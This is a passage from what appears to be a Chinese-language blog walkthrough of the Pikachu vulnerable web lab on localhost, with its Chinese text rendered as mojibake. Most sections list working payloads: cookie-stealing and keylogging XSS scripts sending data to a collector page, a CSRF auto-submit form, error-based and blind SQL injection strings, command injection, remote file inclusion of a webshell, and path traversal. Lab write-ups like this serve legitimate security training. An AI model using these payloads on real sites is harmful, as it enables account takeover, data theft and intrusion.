´è§£" class="headerlink" title="æš´åŠ›ç ´è§£"></a>æš´åŠ›ç ´è§£</h2><p>ä½¿ç”¨burp suiteå³å¯</p><p>burpsuiteæ— æ³•æ‹¦æˆªæœ¬åœ°åŒ…ï¼š<a href="https://blog.csdn.net/qq_38923350/article/details/112497437?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=1">https://blog.csdn.net/qq_38923350/article/details/112497437?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=1</a></p><h3 id="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"><a href="#åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£" class="headerlink" title="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"></a>åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£</h3><p>ä½¿ç”¨intruderæ¨¡å—å³å¯</p><h3 id="éªŒè¯ç ç»•è¿‡ï¼ˆon-serverï¼‰"><a href="#éªŒè¯ç ç»•è¿‡ï¼ˆon-serverï¼‰" class="headerlink" title="éªŒè¯ç ç»•è¿‡ï¼ˆon serverï¼‰"></a>éªŒè¯ç ç»•è¿‡ï¼ˆon serverï¼‰</h3><p>éªŒè¯ç ä¸è¿‡æœŸ </p><h3 id="éªŒè¯ç ç»•è¿‡ï¼ˆon-clientï¼‰"><a href="#éªŒè¯ç ç»•è¿‡ï¼ˆon-clientï¼‰" class="headerlink" title="éªŒè¯ç ç»•è¿‡ï¼ˆon clientï¼‰"></a>éªŒè¯ç ç»•è¿‡ï¼ˆon clientï¼‰</h3><p>ç›´æ¥çˆ†ç ´</p><h3 id="tokené˜²çˆ†ç ´"><a href="#tokené˜²çˆ†ç ´" class="headerlink" title="tokené˜²çˆ†ç ´?"></a>tokené˜²çˆ†ç ´?</h3><p>tokenå¯ä»¥è·å–å¹¶æ”¾å…¥ä¸‹ä¸€æ¬¡çˆ†ç ´ æ³¨æ„é€‰æ‹©åˆé€‚çš„çˆ†ç ´æ–¹å¼ï¼ˆpitchforkï¼‰</p><h2 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h2><h3 id="åå°„å‹XSSï¼ˆgetï¼‰"><a href="#åå°„å‹XSSï¼ˆgetï¼‰" class="headerlink" title="åå°„å‹XSSï¼ˆgetï¼‰"></a>åå°„å‹XSSï¼ˆgetï¼‰</h3><p>è¾“å…¥ä¸€äº›ç‰¹æ®Šå­—ç¬¦è¯•ä¸€ä¸‹ å¦‚æœæœ‰è¾“å…¥å­—ç¬¦é™åˆ¶ï¼ˆå‰ç«¯ï¼‰ï¼Œå¯F12ç›´æ¥ä¿®æ”¹é™åˆ¶å€¼</p><h3 id="åå°„å‹XSSï¼ˆpostï¼‰"><a href="#åå°„å‹XSSï¼ˆpostï¼‰" class="headerlink" title="åå°„å‹XSSï¼ˆpostï¼‰"></a>åå°„å‹XSSï¼ˆpostï¼‰</h3><p>ç™»é™†åè¾“å…¥payload</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="å­˜å‚¨å‹XSS"><a href="#å­˜å‚¨å‹XSS" class="headerlink" title="å­˜å‚¨å‹XSS"></a>å­˜å‚¨å‹XSS</h3><p>å…ˆç‰¹æ®Šå­—ç¬¦è¯•ä¸‹ï¼Œç„¶åè¾“å…¥payload</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DOMå‹xss"><a href="#DOMå‹xss" class="headerlink" title="DOMå‹xss"></a>DOMå‹xss</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&quot;+str+&quot;&#x27;</span>&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;</span><br></pre></td></tr></table></figure><p>æ„é€ payloadæ›¿æ¢æ‰â€+str+â€ï¼Œpayloadä¸º#â€™ onclick &#x3D; â€œalert(â€˜evolutionâ€™)â€&gt;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//è¯•è¯•ï¼š&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">//è¯•è¯•ï¼š&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,é—­åˆæ‰å°±è¡Œ</span><br></pre></td></tr></table></figure><h3 id="DOMå‹xss-x"><a href="#DOMå‹xss-x" class="headerlink" title="DOMå‹xss-x"></a>DOMå‹xss-x</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#&#x27; onclick = &quot;alert(&#x27;evolution&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="xssç›²æ‰“"><a href="#xssç›²æ‰“" class="headerlink" title="xssç›²æ‰“"></a>xssç›²æ‰“</h3><p>è¾“å…¥payload</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç½‘é¡µåç¼€æ”¹ä¸ºadmin_login.phpï¼ŒæŸ¥çœ‹ä¿¡æ¯</p><h3 id="xssä¹‹è¿‡æ»¤"><a href="#xssä¹‹è¿‡æ»¤" class="headerlink" title="xssä¹‹è¿‡æ»¤"></a>xssä¹‹è¿‡æ»¤</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScrIpt</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)</span><span class="tag">&lt;/<span class="name">sCriPt</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="xssä¹‹htmlspecialchars"><a href="#xssä¹‹htmlspecialchars" class="headerlink" title="xssä¹‹htmlspecialchars"></a>xssä¹‹htmlspecialchars</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">q&#x27;onclick=&#x27;alert(1111)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/TNlce25h3JUnP71.png" alt="xss_htmlspecialchars.png"></p><h3 id="xssä¹‹hrefè¾“å‡º"><a href="#xssä¹‹hrefè¾“å‡º" class="headerlink" title="xssä¹‹hrefè¾“å‡º"></a>xssä¹‹hrefè¾“å‡º</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:alert(&#x27;evolution&#x27;)</span><br></pre></td></tr></table></figure><h3 id="xssä¹‹jsè¾“å‡º"><a href="#xssä¹‹jsè¾“å‡º" class="headerlink" title="xssä¹‹jsè¾“å‡º"></a>xssä¹‹jsè¾“å‡º</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">e&#x27;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="pikachu-Xss-åå°"><a href="#pikachu-Xss-åå°" class="headerlink" title="pikachu Xss åå°"></a>pikachu Xss åå°</h2><p>pkxssåå°ï¼š</p><p><a href="http://127.0.0.1:8081/pikachu/pkxss/pkxss_login.php">http://127.0.0.1:8081/pikachu/pkxss/pkxss_login.php</a></p><h3 id="cookieæœé›†"><a href="#cookieæœé›†" class="headerlink" title="cookieæœé›†"></a>cookieæœé›†</h3><h4 id="getå‹ï¼š"><a href="#getå‹ï¼š" class="headerlink" title="getå‹ï¼š"></a>getå‹ï¼š</h4><p>åœ¨åå°„å‹xssï¼ˆgetï¼‰ä¸­è¾“å…¥payloadï¼ˆæ³¨æ„å–æ¶ˆå‰ç«¯å­—ç¬¦é•¿åº¦çš„é™åˆ¶ï¼‰</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;http://127.0.0.1:8081/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2F127.0.0.1%3A8081%2Fpikachu%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&amp;submit=submit</span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥æ›´æ”¹ä¸€ä¸‹ï¼Œè®©ä»–ç»§ç»­è·³è½¬åˆ°æ­£å¸¸ç•Œé¢ï¼ˆä¼ªè£…ä¸€ä¸‹ï¼‰</p><p>ä¿®æ”¹pikachu\pkxss\xcookie\cookie.phpæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1:8081/pikachu/index.php&quot;</span>);<span class="comment">//é‡å®šå‘åˆ°ä¸€ä¸ªå¯ä¿¡çš„ç½‘ç«™</span></span><br></pre></td></tr></table></figure><h4 id="postå‹"><a href="#postå‹" class="headerlink" title="postå‹"></a>postå‹</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/pkxss/xcookie/post.html</span><br></pre></td></tr></table></figure><p>æ³¨æ„ä¿®æ”¹pikachu\pkxss\xcookie\post.htmlæ–‡ä»¶ä¸­çš„ä¸¤ä¸ªåœ°å€é“¾æ¥</p><h4 id="cookieåå°ä¿¡æ¯"><a href="#cookieåå°ä¿¡æ¯" class="headerlink" title="cookieåå°ä¿¡æ¯"></a>cookieåå°ä¿¡æ¯</h4><p><img src="https://s2.loli.net/2022/04/21/BImJ45QWKCT7vnD.png" alt="xss_cookie.png"></p><h3 id="é’“é±¼ç»“æœ"><a href="#é’“é±¼ç»“æœ" class="headerlink" title="é’“é±¼ç»“æœ"></a>é’“é±¼ç»“æœ</h3><p>ä¿®æ”¹pikachu\pkxss\xfish\fish.phpä¸­çš„é“¾æ¥åœ°å€ï¼ˆå…¶ä¸­çš„ç©ºæ ¼è¦å»æ‰ï¼‰</p><p>å­˜å‚¨å‹xssé¢˜ç›®ç•™è¨€æ¿ä¸­è¾“å…¥</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8081/pikachu/pkxss/xfish/fish.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8081/pikachu/pkxss/xfish/fish.php&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/He3G9hPEsKyVR5c.png" alt="xss_fish.png"></p><h3 id="é”®ç›˜è®°å½•"><a href="#é”®ç›˜è®°å½•" class="headerlink" title="é”®ç›˜è®°å½•"></a>é”®ç›˜è®°å½•</h3><p>ä¿®æ”¹pikachu\pkxss\rkeypress\rk.jsä¸­ç¬¬54è¡Œåœ°å€é“¾æ¥</p><p>å­˜å‚¨å‹xssé¢˜ç›®ç•™è¨€æ¿ä¸­è¾“å…¥</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8081/pikachu/pkxss/rkeypress/rk.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/ZQKcLsS3tBixVwq.png" alt="xss_keyboard.png"></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><p>è‹¥è¿›å…¥ç¼–è¾‘é¡µé¢å‡ºç°å¦‚ä¸‹é”™è¯¯ï¼š</p><p><img src="https://s2.loli.net/2022/04/21/q73znWeTiNZjVdA.png" alt="csrf_error.png"></p><p>å°†pikachu\vul\csrf\csrfget\csrf_get_edit.phpæ–‡ä»¶ä¸­çš„MYSQL_ASSOCä¿®æ”¹ä¸ºMYSQLI_ASSOCå³å¯(<strong>å„ä¸ªé¢˜ç›®ä¸­ç›¸åŒæŠ¥é”™åŒç†</strong>)</p><blockquote><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/mastergu2/article/details/107904129">https://blog.csdn.net/mastergu2/article/details/107904129</a></p></blockquote><p>è§‚å¯Ÿæµé‡åŒ…ï¼š</p><p><img src="https://s2.loli.net/2022/04/21/vkdSNTHtz4mLoPK.png" alt="csrf_get.png"></p><p>æ„é€ urlï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=12345678922&amp;add=earth&amp;email=lucy%40pikachu.com&amp;submit=submit</span><br></pre></td></tr></table></figure><h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>æ„é€ post.htmlå³å¯</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;postsubmit&quot;</span>).<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:8081/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;girl&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111111111&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;usa&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;lucy@pikachu.com&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>urlæ„é€ ä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/csrf/csrfpost/post.html</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒåšå®¢ï¼š<a href="https://blog.csdn.net/xuandao_ahfengren/article/details/105699852?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165035634216782184636212%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165035634216782184636212&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-105699852.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3&spm=1018.2226.3001.4187">pikachué¶åœºwp1</a></p></blockquote><h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p>å¾ˆå¥½çš„é˜²å¾¡CSRFæ”»å‡»çš„æ–¹æ³•ã€‚</p><h2 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h2><h3 id="æ•°å­—å‹æ³¨å…¥ï¼ˆpostï¼‰"><a href="#æ•°å­—å‹æ³¨å…¥ï¼ˆpostï¼‰" class="headerlink" title="æ•°å­—å‹æ³¨å…¥ï¼ˆpostï¼‰"></a>æ•°å­—å‹æ³¨å…¥ï¼ˆpostï¼‰</h3><p>ä¼ å…¥å‚æ•°ä¿®æ”¹ä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 or 1 = 1</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/e6lwziJvnFQqxbo.png" alt="sql_post.png"></p><h3 id="å­—ç¬¦å‹æ³¨å…¥ï¼ˆgetï¼‰"><a href="#å­—ç¬¦å‹æ³¨å…¥ï¼ˆgetï¼‰" class="headerlink" title="å­—ç¬¦å‹æ³¨å…¥ï¼ˆgetï¼‰"></a>å­—ç¬¦å‹æ³¨å…¥ï¼ˆgetï¼‰</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; or 1=1#</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; or 1=1-- </span><br></pre></td></tr></table></figure><p>æ³¨æ„ç¬¬äºŒä¸ªpayloadæœ€åæœ‰ä¸ªç©ºæ ¼</p><h3 id="æœç´¢å‹æ³¨å…¥"><a href="#æœç´¢å‹æ³¨å…¥" class="headerlink" title="æœç´¢å‹æ³¨å…¥"></a>æœç´¢å‹æ³¨å…¥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e%&#x27; or 1=1#</span><br></pre></td></tr></table></figure><h3 id="xxå‹æ³¨å…¥"><a href="#xxå‹æ³¨å…¥" class="headerlink" title="xxå‹æ³¨å…¥"></a>xxå‹æ³¨å…¥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e&#x27;) or 1=1#</span><br></pre></td></tr></table></figure><h3 id="â€œinsert-x2F-updateâ€æ³¨å…¥"><a href="#â€œinsert-x2F-updateâ€æ³¨å…¥" class="headerlink" title="â€œinsert&#x2F;updateâ€æ³¨å…¥"></a>â€œinsert&#x2F;updateâ€æ³¨å…¥</h3><blockquote><p>åŸºäºæŠ¥é”™çš„æ³¨å…¥å¯åˆ©ç”¨çš„3ä¸ªå‡½æ•°ï¼š</p><ul><li>updatexml()</li><li>extractvalue()</li><li>floor()</li></ul></blockquote><h4 id="insertï¼ˆæ³¨å†Œï¼‰"><a href="#insertï¼ˆæ³¨å†Œï¼‰" class="headerlink" title="insertï¼ˆæ³¨å†Œï¼‰"></a>insertï¼ˆæ³¨å†Œï¼‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evolution&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><h4 id="updateï¼ˆä¿®æ”¹ï¼‰"><a href="#updateï¼ˆä¿®æ”¹ï¼‰" class="headerlink" title="updateï¼ˆä¿®æ”¹ï¼‰"></a>updateï¼ˆä¿®æ”¹ï¼‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evolution&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><h3 id="â€œdeleteâ€æ³¨å…¥"><a href="#â€œdeleteâ€æ³¨å…¥" class="headerlink" title="â€œdeleteâ€æ³¨å…¥"></a>â€œdeleteâ€æ³¨å…¥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 or updatexml(1,concat(0x7e,database()),0)</span><br></pre></td></tr></table></figure><p>payloadéœ€è¦ä½¿ç”¨urlç¼–ç ä¸€ä¸‹</p><p><img src="https://s2.loli.net/2022/04/21/otBxdq4lAe7hgw5.png" alt="sql_delete.png"></p><h3 id="â€œhttpheaderâ€æ³¨å…¥"><a href="#â€œhttpheaderâ€æ³¨å…¥" class="headerlink" title="â€œhttpheaderâ€æ³¨å…¥"></a>â€œhttpheaderâ€æ³¨å…¥</h3><h4 id="ä¿®æ”¹user-agent"><a href="#ä¿®æ”¹user-agent" class="headerlink" title="ä¿®æ”¹user-agent"></a>ä¿®æ”¹user-agent</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evolution&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/UZHLIDRql5PCo4O.png" alt="sql_useragent.png"></p><h4 id="ä¿®æ”¹cookie"><a href="#ä¿®æ”¹cookie" class="headerlink" title="ä¿®æ”¹cookie"></a>ä¿®æ”¹cookie</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evolution&#x27; and updatexml(1,concat(0x7e,database()),0)#</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/chIJ62TEu4ziW3w.png" alt="sql_cookie.png"></p><h3 id="ç›²æ³¨ï¼ˆbased-on-boolianï¼‰"><a href="#ç›²æ³¨ï¼ˆbased-on-boolianï¼‰" class="headerlink" title="ç›²æ³¨ï¼ˆbased on boolianï¼‰"></a>ç›²æ³¨ï¼ˆbased on boolianï¼‰</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and ascii(substr(database(),1,1))=112#</span><br></pre></td></tr></table></figure><h3 id="ç›²æ³¨ï¼ˆbased-on-timeï¼‰"><a href="#ç›²æ³¨ï¼ˆbased-on-timeï¼‰" class="headerlink" title="ç›²æ³¨ï¼ˆbased on timeï¼‰"></a>ç›²æ³¨ï¼ˆbased on timeï¼‰</h3><p>å°è¯•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and sleep(5)#</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/QN9yJxcgIF6P1AS.png" alt="sql_time.png"></p><p>å‘ç°å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œè¾“å…¥payloadè¿›è¡Œç›²æ³¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and if((substr(database(),1,1))=&#x27;p&#x27;,sleep(5),null)#</span><br></pre></td></tr></table></figure><p>è‹¥å»¶è¿Ÿæ—¶é—´æœ‰5såˆ™databaseç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºpï¼Œå¦åˆ™å­—ç¬¦ä¸å¯¹åº”ã€‚</p><h3 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe%df&#x27; or 1=1#</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/aAp3moSsrUJYe7M.png" alt="sql_widebyte.png"></p><blockquote><h4 id="é™¤äº†ä¸Šè¿°å„ç§æ‰‹åŠ¨æ³¨å…¥æ–¹æ³•ï¼Œè¯»è€…ä¹Ÿå¯ä»¥é€‰æ‹©ä½¿ç”¨sqlmapå·¥å…·è¿›è¡Œæ³¨å…¥ã€‚"><a href="#é™¤äº†ä¸Šè¿°å„ç§æ‰‹åŠ¨æ³¨å…¥æ–¹æ³•ï¼Œè¯»è€…ä¹Ÿå¯ä»¥é€‰æ‹©ä½¿ç”¨sqlmapå·¥å…·è¿›è¡Œæ³¨å…¥ã€‚" class="headerlink" title="é™¤äº†ä¸Šè¿°å„ç§æ‰‹åŠ¨æ³¨å…¥æ–¹æ³•ï¼Œè¯»è€…ä¹Ÿå¯ä»¥é€‰æ‹©ä½¿ç”¨sqlmapå·¥å…·è¿›è¡Œæ³¨å…¥ã€‚"></a>é™¤äº†ä¸Šè¿°å„ç§æ‰‹åŠ¨æ³¨å…¥æ–¹æ³•ï¼Œè¯»è€…ä¹Ÿå¯ä»¥é€‰æ‹©ä½¿ç”¨sqlmapå·¥å…·è¿›è¡Œæ³¨å…¥ã€‚</h4></blockquote><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="execï¼ˆpingï¼‰"><a href="#execï¼ˆpingï¼‰" class="headerlink" title="execï¼ˆpingï¼‰"></a>execï¼ˆpingï¼‰</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; ipconfig</span><br></pre></td></tr></table></figure><h3 id="execï¼ˆevalï¼‰"><a href="#execï¼ˆevalï¼‰" class="headerlink" title="execï¼ˆevalï¼‰"></a>execï¼ˆevalï¼‰</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><h3 id="File-Inclusion-local"><a href="#File-Inclusion-local" class="headerlink" title="File Inclusion(local)"></a>File Inclusion(local)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/fileinclude/fi_local.php?filename=../../../test/phpinfo.txt&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><h3 id="File-Inclusion-remote"><a href="#File-Inclusion-remote" class="headerlink" title="File Inclusion(remote)"></a>File Inclusion(remote)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1:8081/pikachu/test/yijuhua.txt&amp;submit=æäº¤æŸ¥è¯¢</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/fileinclude/yijuhua.php?x=ipconfig</span><br></pre></td></tr></table></figure><h2 id="unsafe-filedownload"><a href="#unsafe-filedownload" class="headerlink" title="unsafe filedownload"></a>unsafe filedownload</h2><h3 id="unsafe-filedownload-1"><a href="#unsafe-filedownload-1" class="headerlink" title="unsafe filedownload"></a>unsafe filedownload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/unsafedownload/execdownload.php?filename=../../../wiki/image/title.png</span><br></pre></td></tr></table></figure><h2 id="unsafe-fileupload"><a href="#unsafe-fileupload" class="headerlink" title="unsafe fileupload"></a>unsafe fileupload</h2><h3 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h3><p>å‰ç«¯é™åˆ¶ï¼Œåˆ é™¤æ£€æŸ¥å‡½æ•°å³å¯</p><p><img src="https://s2.loli.net/2022/04/21/rLMYNFlORvZIS7h.png" alt="upload_client.png"></p><h3 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h3><p>ä¿®æ”¹postè¯·æ±‚çš„Content-Typeå­—æ®µå³å¯</p><p><img 